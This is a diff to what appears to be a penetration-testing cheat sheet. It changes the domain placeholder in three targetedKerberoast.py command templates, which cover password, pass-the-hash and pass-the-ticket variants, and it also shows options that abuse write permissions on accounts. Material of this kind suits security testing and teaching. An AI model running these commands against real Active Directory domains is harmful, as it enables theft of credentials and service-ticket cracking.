@@ -15,7 +15,7 @@ GenericAll, GenericWrite, WriteProperty or Validated-SPN
 --only-abuse  Ignore accounts that have an SPN
 --no-abuse    Don't attempt targeted Kerberoasting
 ```
-targetedKerberoast.py -v -d <domain> -u <user> -p <password> --dc-ip <dc_ip>
+targetedKerberoast.py -v -d <domain_fqdn> -u <user> -p <password> --dc-ip <dc_ip>
 ```
 
 ## targetedKerberoast (pth)
@@ -25,7 +25,7 @@ targetedKerberoast.py -v -d <domain> -u <user> -p <password> --dc-ip <dc_ip>
 --only-abuse  Ignore accounts that have an SPN
 --no-abuse    Don't attempt targeted Kerberoasting
 ```
-targetedKerberoast.py -v -d <domain> -u <user> -H <nt_hash> --dc-ip <dc_ip>
+targetedKerberoast.py -v -d <domain_fqdn> -u <user> -H <nt_hash> --dc-ip <dc_ip>
 ```
 
 ## targetedKerberoast (ptt)
@@ -36,7 +36,7 @@ targetedKerberoast.py -v -d <domain> -u <user> -H <nt_hash> --dc-ip <dc_ip>
 --no-abuse    Don't attempt targeted Kerberoasting
 ```
 export KRB5CCNAME=<ccache>
-targetedKerberoast.py -v -d <domain> -k --no-pass --dc-ip <dc_ip>
+targetedKerberoast.py -v -d <domain_fqdn> -k --no-pass --dc-ip <dc_ip>
 ```
 
 
